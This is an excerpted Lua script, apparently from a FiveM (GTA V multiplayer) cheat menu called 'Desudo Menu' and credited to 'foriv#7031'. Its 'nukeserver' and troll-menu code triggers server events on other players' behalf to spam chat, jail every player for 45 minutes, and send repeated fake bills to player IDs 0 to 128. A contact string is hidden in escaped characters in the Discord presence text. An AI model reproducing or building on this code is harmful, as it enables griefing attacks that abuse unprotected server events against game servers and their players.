...
function teleportToNearestVehicle()
    ...
    Citizen.CreateThread(function()
        while discordPresence do
            ...
            SetDiscordRichPresenceAssetText("Desudo Menu | BY: | \102\111\114\105\118\35\55\48\51\49\32 | to get it")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Gh0st; foriv#7031 ")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'foriv#7031 ',
                    {0, 0x99, 255},
                    '/ddddddddddddd Desudo Menu'
                )
                TriggerServerEvent('_chat:messageEntered', 'foriv#7031 ', {0, 0x99, 255}, 'Desudo Menu <3')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Desudo BO$$ <3 foriv#7031 ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Desudo<3 foriv#7031 ")
					end
				end
    ...
    function()
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                ...
                drawNotification("~h~~s~Edit by ~b~foriv#7031 ")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Desudo menu", "6969696969")
        ...
        drawNotification(
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
				    if Plane.Button("∑~r~~h~foriv#7031  - Editor") then
				elseif Plane.Button("∑~o~~h~foriv#7031  - Owner") then
				elseif Plane.Button("∑~h~Desudo Menu <3") then
				end
				Plane.Display()
